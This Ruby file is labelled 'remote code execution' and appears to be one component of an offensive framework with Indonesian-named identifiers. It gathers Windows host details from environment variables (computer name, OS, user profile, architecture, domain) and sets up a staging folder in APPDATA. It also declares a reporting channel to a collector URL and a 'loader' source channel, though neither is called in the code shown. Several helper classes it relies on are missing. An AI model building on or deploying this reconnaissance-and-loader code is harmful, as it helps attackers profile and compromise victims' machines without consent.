#$gintkel: remote code execution xglo

module Gintkel
	@cmd = BarisPerintah.new

	def self.markas
		return File.join(@cmd.environment_variable("APPDATA"), "Gintkel")
	end

	def self.first_executor
		::Gintkel::RCE::PemeriksaSpesifikasi
	end

	module RCE
		class PembacaEnvironment < Executor
			def root
				return @daftar[0]
			end

			def name
				return @daftar[1]
			end

			def os
				return @daftar[2]
			end

			def mount
				return @daftar[3]
			end

			def home
				return @daftar[4]
			end

			def arch
				return @daftar[5]
			end

			def label
				return @daftar[6]
			end

			def persiapan
				@daftar = %w(
					APPDATA
					COMPUTERNAME
					OS
					HOMEDRIVE
					USERPROFILE
					PROCESSOR_ARCHITECTURE
					USERDOMAIN
				)
			end

			def lancarkan
				@daftar.collect! { |i| eVar(i) }
			end
		end

		class PemeriksaSpesifikasi < Executor
			class Laporan < Saluran
				def url
					::Gintkel.collector("laporan")
				end
			end

			class Sumber < Saluran
				def url
					::Gintkel.provide("loader")
				end
			end

			def persiapan
				@env = ::Gintkel::RCE::PembacaEnvironment.new
				@laporan = Laporan.new
				@sumber = Sumber.new
			end

			def lancarkan
				@env.lancarkan
				puts " Information Retrieve ======================================= "
				puts "   Folder Root        #{@env.root} "
				puts "   Name               #{@env.name}"
				puts "   Operation System   #{@env.os}"
				puts "   Mount Location     #{@env.mount}"
				puts "   Home               #{@env.home}"
				puts "   Architecture       #{@env.arch}"
				puts "   Network Label      #{@env.label}"
				puts " ============================================================= "
			end
		end
	end
end